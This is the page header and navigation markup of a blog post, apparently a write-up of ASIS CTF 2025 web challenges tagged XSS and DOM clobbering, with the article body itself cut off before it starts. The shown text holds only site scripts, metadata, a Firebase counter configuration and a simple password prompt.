<!DOCTYPE html>

<html class="scroll-smooth" data-auto-appearance="true" data-default-appearance="dark" dir="ltr" lang="en"><head>
<meta charset="utf-8"/>
<meta content="en" http-equiv="content-language"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="ie=edge" http-equiv="X-UA-Compatible"/>
<meta name="theme-color"/>
<title>ASIS-CTF-2025å¤ç° Â· Delete's blog</title>
<meta content="ASIS-CTF-2025å¤ç° Â· Delete's blog" name="title"/>
<meta content="A CTFer find something funny" name="description"/>
<meta content="XSS,DOM-Clobbering,xss-to-sql,DOMç ´å," name="keywords"/>
<link href="https://ml-hacker.github.io/posts/asis-ctf-2025%E5%A4%8D%E7%8E%B0/" rel="canonical"/>
<link href="/css/main.bundle.min.8ae4b478ff7329e5aeb2ee129da2ea38b7c9ed6222bbecaf273840388a43b9c682ac49e60bc8b5f7cd9d752f6fd44ae086deeb5ae241bbb439beb9fa8424fe6a.css" rel="stylesheet" type="text/css"/>
<script src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js" type="text/javascript"></script>
<script data-copied="Copied" data-copy="Copy" defer="" id="script-bundle" src="/js/main.bundle.min.458a544dcb3823846b3223eb7edab5104f1d9b99925cbbd876092b40422e5086033868b32c3da5c471356605c4cc897e765a267001ee04ed5acfad7a799764cb.js" type="text/javascript"></script>
<script src="/lib/zoom/zoom.min.umd.b4b722fcb5d42f34f52b30a92f3521b69f403ca9d96d0d6179eb537cb870f5d83fdf1fe836688d95d5c99fefbda4170487711006e56051fa67ea00da10521721.js"></script>
<link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
<link href="/site.webmanifest" rel="manifest"/>
<meta content="https://ml-hacker.github.io/posts/asis-ctf-2025%E5%A4%8D%E7%8E%B0/" property="og:url"/>
<meta content="Delete's blog" property="og:site_name"/>
<meta content="ASIS-CTF-2025å¤ç°" property="og:title"/>
<meta content="A CTFer find something funny" property="og:description"/>
<meta content="en" property="og:locale"/>
<meta content="article" property="og:type"/>
<meta content="posts" property="article:section"/>
<meta content="2025-09-25T00:15:07+08:00" property="article:published_time"/>
<meta content="2025-09-25T00:15:07+08:00" property="article:modified_time"/>
<meta content="Xss" property="article:tag"/>
<meta content="DOM-Clobbering" property="article:tag"/>
<meta content="Xss-to-Sql" property="article:tag"/>
<meta content="DOMç ´å" property="article:tag"/>
<meta content="https://ml-hacker.github.io/posts/asis-ctf-2025%E5%A4%8D%E7%8E%B0/featured.png" property="og:image"/>
<meta content="summary_large_image" name="twitter:card"/>
<meta content="https://ml-hacker.github.io/posts/asis-ctf-2025%E5%A4%8D%E7%8E%B0/featured.png" name="twitter:image"/>
<meta content="ASIS-CTF-2025å¤ç°" name="twitter:title"/>
<meta content="A CTFer find something funny" name="twitter:description"/>
<meta content="https://ml-hacker.github.io/posts/asis-ctf-2025%E5%A4%8D%E7%8E%B0/featured.png" name="twitter:image"/>
<meta content="https://ml-hacker.github.io/posts/asis-ctf-2025%E5%A4%8D%E7%8E%B0/featured.png" property="og:image"/>
<script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "ASIS-CTF-2025å¤ç°",
    "headline": "ASIS-CTF-2025å¤ç°",
    
    
    "inLanguage": "en",
    "url" : "https:\/\/ml-hacker.github.io\/posts\/asis-ctf-2025%E5%A4%8D%E7%8E%B0\/",
    "author" : {
      "@type": "Person",
      "name": "Delete\u0027s blog"
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-09-25T00:15:07\u002b08:00",
    "datePublished": "2025-09-25T00:15:07\u002b08:00",
    
    "dateModified": "2025-09-25T00:15:07\u002b08:00",
    
    "keywords": ["XSS","DOM-Clobbering","xss-to-sql","DOMç ´å"],
    
    "mainEntityOfPage": "true",
    "wordCount": "1576"
  }]
  </script>
<meta content="Delete's blog" name="author"/>
<link href="delete@student.gdufe.edu.cn" rel="me"/>
<link href="https://github.com/ML-hacker" rel="me"/>
<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
<script>

    const firebaseConfig = {
      apiKey: "AIzaSyCttX9CvLt5q9ivhSRRldSgNxB4loLvwSo",
      authDomain: "AIzaSyCttX9CvLt5q9ivhSRRldSgNxB4loLvwSo",
      projectId: "like-6851a",
      storageBucket: "like-6851a.firebasestorage.app",
      messagingSenderId: "663302573870",
      appId: "1:663302573870:web:db2818ca9e5ea64c41f4bf",
      measurementId: "G-FNF9MJ1961"
    };

    var app = firebase.initializeApp(firebaseConfig);
    var db = firebase.firestore();
    var auth = firebase.auth();

  </script>
</head>
<body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
<div class="absolute flex self-center" id="the-top">
<a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href="#main-content">
<span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">â†“</span>
        Skip to main content
      </a>
</div>
<div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100">
<div class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800" id="menu-blur"></div>
<div class="relative max-w-[64rem] ml-auto mr-auto">
<div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
<div class="flex flex-1 items-center justify-between">
<nav class="flex space-x-3">
<a class="text-base font-medium text-gray-500 hover:text-gray-900" href="/">
          Deleteâ€™s blog
        </a>
</nav>
<nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/">
<span class="mr-1">
<span class="relative block icon"><svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
<path d="M0 32v448h448V32H0zm21.2 197.2H21c.1-.1.2-.3.3-.4 0 .1 0 .3-.1.4zm218 53.9V384h-31.4V281.3L128 128h37.3c52.5 98.3 49.2 101.2 59.3 125.6 12.3-27 5.8-24.4 60.6-125.6H320l-80.8 155.1z" fill="currentColor"></path></svg></span>
</span>
<p class="text-base font-medium" title="Delete's blog">
    Home
  </p>
</a>
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/posts/">
<span class="mr-1">
<span class="relative block icon"><svg viewbox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
<path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z" fill="currentColor"></path></svg></span>
</span>
<p class="text-base font-medium" title="Posts">
    Post
  </p>
</a>
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/friends/">
<span class="mr-1">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4 0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4c0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8 0L0 176z" fill="currentColor"></path></svg></span>
</span>
<p class="text-base font-medium" title="å‹é“¾">
    Friend
  </p>
</a>
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/about/">
<span class="mr-1">
<span class="relative block icon"><svg viewbox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
<path d="M50.8 452.1L19.2 477.4c-2.1 1.7-4.7 2.6-7.4 2.6C5.3 480 0 474.7 0 468.2V192C0 86 86 0 192 0S384 86 384 192V468.2c0 6.5-5.3 11.8-11.8 11.8c-2.7 0-5.3-.9-7.4-2.6l-31.6-25.3c-3.3-2.7-7.5-4.1-11.8-4.1c-5.9 0-11.5 2.8-15 7.5l-37.6 50.1c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4l-38.4-51.2c-3-4-7.8-6.4-12.8-6.4s-9.8 2.4-12.8 6.4l-38.4 51.2c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4L77.6 455.5c-3.6-4.7-9.1-7.5-15-7.5c-4.3 0-8.4 1.5-11.7 4.1zM160 192c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32zm96 32c17.7 0 32-14.3 32-32s-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32z" fill="currentColor"></path></svg></span>
</span>
<p class="text-base font-medium" title="ABOUT MEEE">
    About
  </p>
</a>
<button aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400" id="search-button" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
</span>
</button>
<div class="flex items-center">
<button aria-label="Dark mode switcher" class="text-base hover:text-primary-600 dark:hover:text-primary-400" id="appearance-switcher" type="button">
<div class="flex items-center justify-center dark:hidden">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z" fill="currentColor"></path></svg>
</span>
</div>
<div class="items-center justify-center hidden dark:flex">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z" fill="currentColor"></path></svg>
</span>
</div>
</button>
</div>
</nav>
<div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
<span></span>
<button aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400" id="search-button-mobile" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
</span>
</button>
<button aria-label="Dark mode switcher" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1" id="appearance-switcher-mobile" type="button">
<div class="flex items-center justify-center dark:hidden">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z" fill="currentColor"></path></svg>
</span>
</div>
<div class="items-center justify-center hidden dark:flex">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z" fill="currentColor"></path></svg>
</span>
</div>
</button>
</div>
</div>
<div class="-my-2 md:hidden">
<div class="block" id="menu-button">
<div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
<span class="relative block icon"><svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z" fill="currentColor"></path></svg>
</span>
</div>
<div class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]" id="menu-wrapper">
<ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
<li id="menu-close-button">
<span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
<span class="relative block icon"><svg viewbox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z" fill="currentColor"></path></svg>
</span>
</span>
</li>
<li class="mt-1">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/">
<div class="mr-2">
<span class="relative block icon"><svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
<path d="M0 32v448h448V32H0zm21.2 197.2H21c.1-.1.2-.3.3-.4 0 .1 0 .3-.1.4zm218 53.9V384h-31.4V281.3L128 128h37.3c52.5 98.3 49.2 101.2 59.3 125.6 12.3-27 5.8-24.4 60.6-125.6H320l-80.8 155.1z" fill="currentColor"></path></svg></span>
</div>
<p class="text-bg font-bg" title="Delete's blog">
      Home
    </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/posts/">
<div class="mr-2">
<span class="relative block icon"><svg viewbox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
<path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z" fill="currentColor"></path></svg></span>
</div>
<p class="text-bg font-bg" title="Posts">
      Post
    </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/friends/">
<div class="mr-2">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4 0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4c0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8 0L0 176z" fill="currentColor"></path></svg></span>
</div>
<p class="text-bg font-bg" title="å‹é“¾">
      Friend
    </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/about/">
<div class="mr-2">
<span class="relative block icon"><svg viewbox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
<path d="M50.8 452.1L19.2 477.4c-2.1 1.7-4.7 2.6-7.4 2.6C5.3 480 0 474.7 0 468.2V192C0 86 86 0 192 0S384 86 384 192V468.2c0 6.5-5.3 11.8-11.8 11.8c-2.7 0-5.3-.9-7.4-2.6l-31.6-25.3c-3.3-2.7-7.5-4.1-11.8-4.1c-5.9 0-11.5 2.8-15 7.5l-37.6 50.1c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4l-38.4-51.2c-3-4-7.8-6.4-12.8-6.4s-9.8 2.4-12.8 6.4l-38.4 51.2c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4L77.6 455.5c-3.6-4.7-9.1-7.5-15-7.5c-4.3 0-8.4 1.5-11.7 4.1zM160 192c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32zm96 32c17.7 0 32-14.3 32-32s-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32z" fill="currentColor"></path></svg></span>
</div>
<p class="text-bg font-bg" title="ABOUT MEEE">
      About
    </p>
</a>
</li>
</ul>
</div>
</div>
</div>
</div>
<script>
    (function () {
      var $mainmenu = $(".main-menu");
      var path = window.location.pathname;
      $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
        $(e).children("p").addClass("active");
      });
    })();
  </script>
</div>
</div>
<script data-target-id="menu-blur" src="/js/background-blur.min.7b2acf8ec14c2f4aab9f3b34610bed8d54fba2c3c7e5519005377ee7af9e4d20ea94eae2166561011ec8de5ac41fb35f211121624794f91548190da68eef7545.js" type="text/javascript"></script>
<div class="relative flex flex-col grow">
<main class="grow" id="main-content">
<article>
<div class="w-full rounded-md h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/posts/asis-ctf-2025%E5%A4%8D%E7%8E%B0/featured_hu_8a9efd7dba5aef9b.png);"></div>
<div class="single_hero_background nozoom fixed inset-x-0 top-0 h-[800px]">
<img alt="Background Image" class="absolute inset-0 h-full w-full object-cover" id="background-image-main" src="/img/background.svg"/>
<div class="from-neutral absolute inset-0 bg-gradient-to-t to-transparent mix-blend-normal dark:from-neutral-800"></div>
<div class="from-neutral to-neutral absolute inset-0 bg-gradient-to-t opacity-30 mix-blend-normal dark:from-neutral-800 dark:to-neutral-800 dark:opacity-60"></div>
</div>
<div class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl" id="background-blur"></div>
<script data-image-id="background-image-main" data-image-url="/img/background.svg" data-target-id="background-blur" src="/js/background-blur.min.7b2acf8ec14c2f4aab9f3b34610bed8d54fba2c3c7e5519005377ee7af9e4d20ea94eae2166561011ec8de5ac41fb35f211121624794f91548190da68eef7545.js" type="text/javascript"></script>
<script>
      (function(){
          if (prompt('è¯·è¾“å…¥æ–‡ç« å¯†ç ') != "ASIS"){
              alert('å¯†ç é”™è¯¯ï¼');
              if (history.length === 1) {
                  window.opener = null;
                  window.open('', '_self');
                  window.close();
              } else {
                  history.back();
              }
          }
      })();
  </script>
<header class="mt-5 max-w-prose" id="single_header">
<h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        ASIS-CTF-2025å¤ç°
      </h1>
<div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
<div class="flex flex-row flex-wrap items-center">
<time datetime="2025-09-25T00:15:07+08:00">25 September 2025</time><span class="px-2 text-primary-500">Â·</span><span>1576 words</span><span class="px-2 text-primary-500">Â·</span><span title="Reading time">8 mins</span><span class="px-2 text-primary-500">Â·</span><span>
<span class="animate-pulse inline-block text-transparent max-h-3 rounded-full -mt-[2px] align-middle bg-neutral-300 dark:bg-neutral-400" id="views_posts\ASIS CTF 2025å¤ç°\index.md" title="views">loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewbox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
<path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z" fill="currentColor"></path></svg></span></span>
</span>
<span class="px-2 text-primary-500">Â·</span><span>
<span class="animate-pulse inline-block text-transparent max-h-3 rounded-full -mt-[2px] align-middle bg-neutral-300 dark:bg-neutral-400" id="likes_posts\ASIS CTF 2025å¤ç°\index.md" title="likes">loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
<path d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z" fill="currentColor"></path></svg></span></span>
</span>
<span class="px-2 text-primary-500">Â·</span><span>
<button class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400" id="button_likes">
<span class="inline-block align-text-bottom hidden" id="button_likes_heart"><span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
<path d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z" fill="currentColor"></path></svg></span>
</span>
<span class="inline-block align-text-bottom" id="button_likes_emtpty_heart"><span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
<path d="M244 84L255.1 96L267.1 84.02C300.6 51.37 347 36.51 392.6 44.1C461.5 55.58 512 115.2 512 185.1V190.9C512 232.4 494.8 272.1 464.4 300.4L283.7 469.1C276.2 476.1 266.3 480 256 480C245.7 480 235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1 0 232.4 0 190.9V185.1C0 115.2 50.52 55.58 119.4 44.1C164.1 36.51 211.4 51.37 244 84C243.1 84 244 84.01 244 84L244 84zM255.1 163.9L210.1 117.1C188.4 96.28 157.6 86.4 127.3 91.44C81.55 99.07 48 138.7 48 185.1V190.9C48 219.1 59.71 246.1 80.34 265.3L256 429.3L431.7 265.3C452.3 246.1 464 219.1 464 190.9V185.1C464 138.7 430.4 99.07 384.7 91.44C354.4 86.4 323.6 96.28 301.9 117.1L255.1 163.9z" fill="currentColor"></path></svg></span></span>
<span id="button_likes_text">Â Like</span>
</button>
</span>
</div>
<div class="flex flex-row flex-wrap items-center">
<a class="relative mt-[0.5rem] mr-2" href="/categories/web/"><span class="flex cursor-pointer">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    WEB
  </span>
</span>
</a>
<a class="relative mt-[0.5rem] mr-2" href="/categories/xss/"><span class="flex cursor-pointer">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    XSS
  </span>
</span>
</a>
<a class="relative mt-[0.5rem] mr-2" href="/tags/xss/"><span class="flex cursor-pointer">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Xss
  </span>
</span>
</a>
<a class="relative mt-[0.5rem] mr-2" href="/tags/dom-clobbering/"><span class="flex cursor-pointer">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    DOM-Clobbering
  </span>
</span>
</a>
<a class="relative mt-[0.5rem] mr-2" href="/tags/xss-to-sql/"><span class="flex cursor-pointer">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Xss-to-Sql
  </span>
</span>
</a>
<a class="relative mt-[0.5rem] mr-2" href="/tags/dom%E7%A0%B4%E5%9D%8F/"><span class="flex cursor-pointer">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    DOMç ´å
  </span>
</span>
</a>
</div>
</div>
</header>
<section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
<div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
